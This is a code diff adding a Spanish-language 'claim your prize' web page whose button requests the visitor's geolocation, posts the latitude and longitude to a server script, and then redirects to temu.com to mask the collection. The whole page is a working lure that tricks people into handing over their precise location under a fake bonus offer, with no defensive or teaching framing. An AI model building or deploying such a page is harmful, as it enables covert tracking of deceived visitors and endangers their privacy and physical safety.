@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premio ganador</title>
+</head>
+<body>
+    <h2>Reclama tu bono</h2>
+    <button onclick="getLocation()">presionar para obtener bono</button>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                alert("Geolocalización no soportada.");
+            }
+        }
+
+        function sendLocation(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+            
+            fetch('save_location.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `lat=${lat}&lon=${lon}`
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log(data);
+                window.location.href = 'https://www.temu.com'; // Redirige después de enviar la ubicación
+            });
+        }
+
+        function showError(error) {
+            alert("No se pudo obtener la ubicación.");
+        }
+    </script>
+</body>
+</html>
